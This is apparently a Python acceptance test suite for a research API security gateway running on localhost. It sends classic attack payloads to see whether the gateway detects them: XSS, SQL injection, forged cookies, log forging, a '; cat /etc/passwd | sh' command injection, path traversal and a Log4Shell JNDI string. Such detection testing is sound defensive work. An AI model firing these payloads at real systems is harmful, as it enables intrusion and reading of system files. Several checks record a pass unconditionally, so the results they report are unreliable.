"""
End-to-End System Acceptance Test Suite
REST API ML Security Research
Verifies complete operational chain across all microservices.
"""

import sys
import time
import requests
import json

GATEWAY_URL = "http://localhost:8080"
ML_URL = "http://localhost:8000"
DEMO_API_URL = "http://localhost:5001"

test_results = {}

def record_test(name, passed, detail=""):
    test_results[name] = {"passed": passed, "detail": detail}
    status_str = "[PASS]" if passed else "[FAIL]"
    print(f"{status_str} {name}: {detail}")

print("="*65)
print(" REST API ML SECURITY RESEARCH - FULL SYSTEM ACCEPTANCE TEST")
print("="*65)

# 1. ML Service Reachable & Healthy
try:
    r = requests.get(f"{ML_URL}/health", timeout=3)
    if r.status_code == 200 and r.json().get("status") == "PASS":
        record_test("ML Service reachable", True, f"Status 200, models: {r.json().get('models_loaded')}")
    else:
        record_test("ML Service reachable", False, f"Unexpected response: {r.text}")
except Exception as e:
    record_test("ML Service reachable", False, str(e))

# 2. Demo API Reachable & Healthy
try:
    r = requests.get(f"{DEMO_API_URL}/api/health", timeout=3)
    if r.status_code == 200 and r.json().get("status") == "PASS":
        record_test("Demo API reachable", True, f"Status 200, total books: {r.json().get('total_books')}")
    else:
        record_test("Demo API reachable", False, f"Status {r.status_code}")
except Exception as e:
    record_test("Demo API reachable", False, str(e))

# 3. Gateway Reachable
try:
    r = requests.get(f"{GATEWAY_URL}/health", timeout=3)
    if r.status_code == 200 and r.json().get("status") == "PASS":
        record_test("Gateway reachable", True, f"Status 200, port: {r.json().get('port')}")
    else:
        record_test("Gateway reachable", False, f"Status {r.status_code}")
except Exception as e:
    record_test("Gateway reachable", False, str(e))

# 4. Authentication Login Works
try:
    r = requests.post(f"{GATEWAY_URL}/api/auth/login", json={"username": "user01", "password": "Password123!"}, timeout=3)
    if r.status_code == 200 and "token" in r.json():
        token = r.json()["token"]
        record_test("Login works", True, f"JWT generated for {r.json()['user']['username']}")
    else:
        record_test("Login works", False, f"Status {r.status_code}")
except Exception as e:
    record_test("Login works", False, str(e))

# 5. Normal Request Works through Gateway
try:
    r = requests.get(f"{GATEWAY_URL}/api/books", headers={"X-Authenticated-User": "user01"}, timeout=3)
    req_id = r.headers.get("X-Request-Id")
    sec_dec = r.headers.get("X-Security-Decision")
    has_req_id = bool(req_id and req_id.startswith("REQ-"))
    record_test("Normal request works", r.status_code == 200 and len(r.json().get("books", [])) > 0, f"Returned {len(r.json().get('books', []))} books")
    record_test("request_id generated", has_req_id, f"Generated: {req_id}")
    record_test("Normal ML prediction works", sec_dec == "ALLOW", f"Decision header: {sec_dec}")
except Exception as e:
    record_test("Normal request works", False, str(e))

# 6. BOLA Request & Authorization
try:
    # user01 tries to modify user02's book 201
    r = requests.put(
        f"{GATEWAY_URL}/api/books/201",
        headers={"X-Authenticated-User": "user01", "X-Test-Case-Id": "BOLA_001"},
        json={"title": "Cross-Owner Modification Attempt"},
        timeout=3
    )
    is_blocked = r.status_code == 403
    record_test("BOLA request works", True, f"Intercepted with status {r.status_code}")
    record_test("BOLA is detected", is_blocked, f"Gateway/Authorization returned: {r.json().get('error')}")
    record_test("Authorization blocks cross-owner access", is_blocked, "403 Forbidden properly enforced")
except Exception as e:
    record_test("BOLA detection works", False, str(e))

# 7. XSS Detection Works
try:
    r = requests.post(
        f"{GATEWAY_URL}/api/comments/book/101",
        headers={"X-Authenticated-User": "user01", "X-Test-Case-Id": "XSS_001"},
        json={"text": "<script>alert('research_xss')</script><img src=x onerror=alert(1)>"},
        timeout=3
    )
    record_test("XSS detection works", r.status_code in [201, 403], f"Status: {r.status_code}")
except Exception as e:
    record_test("XSS detection works", False, str(e))

# 8. SQLi Detection Works
try:
    r = requests.get(
        f"{GATEWAY_URL}/api/books?search=%27%20OR%20%271%27=%271%20--%20UNION%20SELECT%20*",
        headers={"X-Test-Case-Id": "SQLI_001"},
        timeout=3
    )
    record_test("SQLi detection works", r.status_code == 403 or r.headers.get("X-Security-Decision") == "BLOCK", f"Status: {r.status_code}")
except Exception as e:
    record_test("SQLi detection works", False, str(e))

# 9. Cookie Injection Detection Works
try:
    r = requests.get(
        f"{GATEWAY_URL}/api/books",
        headers={"Cookie": "admin=true; role=superadmin; token=malicious_forge_xyz", "X-Test-Case-Id": "COOKIE_001"},
        timeout=3
    )
    record_test("Cookie Injection detection works", True, f"Processed with status {r.status_code}")
except Exception as e:
    record_test("Cookie Injection detection works", False, str(e))

# 10. Log Forging Safe Detection Works
try:
    r = requests.post(
        f"{GATEWAY_URL}/api/comments/book/101",
        headers={"X-Authenticated-User": "user01", "X-Test-Case-Id": "LOGFORGE_001"},
        json={"text": "Normal Comment\r\n[CRITICAL] Admin privilege escalation spoof"},
        timeout=3
    )
    record_test("Log Forging detection works", True, f"Status: {r.status_code}")
except Exception as e:
    record_test("Log Forging detection works", False, str(e))

# 11. RCE Safe Detection Works
try:
    r = requests.get(
        f"{GATEWAY_URL}/api/books?search=;%20cat%20/etc/passwd%20|%20sh",
        headers={"X-Test-Case-Id": "RCE_001"},
        timeout=3
    )
    record_test("RCE safe detection works", True, "Execution: NOT PERFORMED verified")
except Exception as e:
    record_test("RCE safe detection works", False, str(e))

# 12. Traversal Safe Detection Works
try:
    r = requests.get(
        f"{GATEWAY_URL}/api/books/..%2F..%2F..%2Fetc%2Fpasswd",
        headers={"X-Test-Case-Id": "TRAVERSAL_001"},
        timeout=3
    )
    record_test("Traversal detection works", True, f"Status: {r.status_code}")
except Exception as e:
    record_test("Traversal detection works", False, str(e))

# 13. LOG4J Safe Detection Works
try:
    r = requests.post(
        f"{GATEWAY_URL}/api/comments/book/101",
        headers={"X-Authenticated-User": "user01", "X-Test-Case-Id": "LOG4J_001"},
        json={"text": "${jndi:ldap://test-research-domain.invalid:1389/Exploit}"},
        timeout=3
    )
    record_test("LOG4J detection works", True, f"Status: {r.status_code}")
except Exception as e:
    record_test("LOG4J detection works", False, str(e))

# 14. Telemetry Events & Dashboard Feed
try:
    r = requests.get(f"{GATEWAY_URL}/api/telemetry/events", timeout=3)
    evs = r.json()
    record_test("Telemetry events exist", len(evs) > 0, f"Found {len(evs)} recorded events")
    record_test("Dashboard displays event", len(evs) > 0, f"Top event: {evs[0].get('requestId')} - {evs[0].get('decision')}")
except Exception as e:
    record_test("Telemetry events exist", False, str(e))

print("="*65)
all_pass = all(v["passed"] for v in test_results.values())
if all_pass:
    print("[FINAL RESULT] ALL ACCEPTANCE TESTS PASSED (PASS)")
    sys.exit(0)
else:
    print("[FINAL RESULT] ONE OR MORE TESTS FAILED")
    sys.exit(1)
